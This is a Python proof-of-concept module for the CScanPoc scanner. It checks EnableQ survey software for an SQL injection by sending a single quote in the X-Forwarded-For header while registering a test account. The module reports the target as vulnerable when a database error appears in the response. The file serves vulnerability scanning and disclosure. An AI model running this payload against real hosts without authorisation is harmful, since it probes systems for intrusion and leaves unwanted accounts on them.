# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import base64
import urllib
import random
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'EnableQ_0000' # 平台漏洞编号，留空
    name = 'EnableQ全版本通杀sql注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-02-08'  # 漏洞公布时间
    desc = '''
        EnableQ全版本通杀sql注入（影响电信、金融、大型互联网公司、政府等）
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=082118
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'EnableQ'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b901fe34-da69-4238-bd66-f41c595ca87b'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "./r.php?qlang=cn&qid=&step=1"
            mail = "testvul" + str(random.randint(1000, 9999)) + "@testvul.net"
            header = "X-Forwarded-For: 1.1.1.1'\r\n"
            data = 'administrators_Name='+mail+'&nickName=testvul&passWord=123456&passWord2=123456&hintPass=3&answerPass=testvul&Action=MemberAddSubmit&submit=%D7%A2%B2%E1&qid='
            code, head, res, errcode,finalurl = hh.http(url + ' -H "' +header +'"' + " -d " + data)
                       
            if res.find("Bad SQL Query") != -1 and res.find("administratorsName") != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()